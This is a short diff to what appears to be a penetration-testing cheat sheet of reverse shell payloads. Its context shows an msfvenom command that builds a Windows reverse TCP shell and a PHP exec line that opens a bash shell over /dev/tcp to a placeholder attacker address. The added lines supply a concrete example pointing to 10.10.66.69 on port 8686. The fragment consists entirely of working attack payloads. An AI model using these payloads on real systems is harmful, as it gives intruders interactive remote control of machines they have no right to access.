@@ -59,3 +59,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -e x86/shik
 exec("/bin/bash -c 'bash -i >& /dev/tcp/[ATTACK-IP]/[PORT] 0>&1'")
 ?>
 ```
+Example: 
+```
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.66.69/8686 0>&1'")
+?>
